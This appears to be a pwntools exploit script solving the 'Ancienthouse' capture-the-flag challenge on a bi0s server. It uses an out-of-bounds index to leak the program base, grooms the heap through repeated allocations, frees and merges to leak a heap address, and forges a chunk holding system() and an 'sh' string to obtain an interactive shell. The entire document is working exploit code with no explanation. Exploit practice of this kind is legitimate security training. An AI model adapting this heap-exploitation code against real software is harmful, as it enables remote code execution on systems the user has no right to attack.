from pwn import *



#p = process("./Ancienthouse")
p = remote("pwn.challenge.bi0s.in", 1230)

currentIdx = -1

def battle(idx):
	p.sendlineafter(">>","2")
	p.sendlineafter("id",str(idx))
#-7

def battleToFree(idx):
	for i in range(7):
		p.sendlineafter(">>","2")
		p.sendlineafter("id",str(idx))
	p.sendlineafter(">>","1")	

def add(size,name):
	global currentIdx
	currentIdx = currentIdx + 1 
	p.sendlineafter(">>","1")
	p.sendlineafter("size",str(size))
	p.sendafter("name",name)

def merge(idx1,idx2):
	p.sendlineafter(">>","3")
	p.sendlineafter("id",str(idx1))
	p.sendlineafter("id",str(idx2))

#gdb.attach(p)

p.sendlineafter("halls","namnp")




battle(-7)
p.recvuntil("with")
leak = p.recvuntil(" .")[1:-2]
print(leak)

print(len(leak))	
elf_base = u64(leak.ljust(8,b'\x00')) - 0x4008
system = elf_base + 0x1170

print("elf_base : %x" %elf_base)
print("system : %x" %system)
p.sendlineafter(">>","2")

for i in range(16):
	add(0x10,"B"*0x10) #idx 0
#idx 7
chra = 0x41
for i in range(8):
	battleToFree(i)
	battleToFree(8+i)
	if(chra != 0x43):
		add(0x20,chr(chra)*0x20) #idx 0
	else:
		buff = p64(0x384adf93) + p64(0) + p64(0x0000005300000002) + p64(0xfffffffffffffffd)
		add(0x20,buff) #idx 0
	print("currentIdx : %d" %currentIdx)
	chra += 1

#
#
add(0x10,"sh;sh;sh;")
add(0x10,"2"*0x10)
battleToFree(currentIdx-1)
battleToFree(currentIdx)
add(0x20,"1")
print("currentIdx : %d" %currentIdx)
battle(currentIdx)
p.recvuntil("with")
leak = p.recvuntil(" .")[1:-2]
heap = u64(leak.ljust(8,b'\x00')) - 0x31 + 0x50
print("heap : %x" %heap)
#gdb.attach(p)

#for trigger grow
#prepare to next alloc 0x40
#start address at 0x80 -> grow to ffc
for i in range(61): 
	add(0x40,"aaaa")

merge(16,17)
add(0x50,p64(system) + p64(heap))
p.sendlineafter(">>","4")
#gdb.attach(p)
#arenas[0].bins[5]

p.interactive()

